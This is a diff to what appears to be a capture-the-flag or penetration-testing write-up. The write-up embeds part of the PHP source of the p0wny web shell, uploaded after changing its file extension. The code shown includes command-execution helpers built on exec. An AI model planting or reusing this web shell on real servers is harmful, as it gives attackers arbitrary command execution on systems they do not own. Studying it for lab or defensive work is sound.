@@ -34,12 +34,10 @@ There is a  tool called ponyshell, downloaded and change its extensions
 <br/><br/>
 ```php
 <?php
-
 $SHELL_CONFIG = array(
     'username' => 'p0wny',
     'hostname' => 'shell',
 );
-
 function expandPath($path) {
     if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
         exec("echo $match[1]", $stdout);
@@ -47,7 +45,6 @@ function expandPath($path) {
     }
     return $path;
 }
-
 function allFunctionExist($list = array()) {
     foreach ($list as $entry) {
         if (!function_exists($entry)) {
@@ -56,7 +53,6 @@ function allFunctionExist($list = array()) {
     }
     return true;
 }
-
 function executeCommand($cmd) {
     $output = '';
     if (function_exists('exec')) {
@@ -87,7 +83,6 @@ function executeCommand($cmd) {
     }
     return $output;
 }
-
 function isRunningWindows() {
     return stripos(PHP_OS, "WIN") === 0;
 }
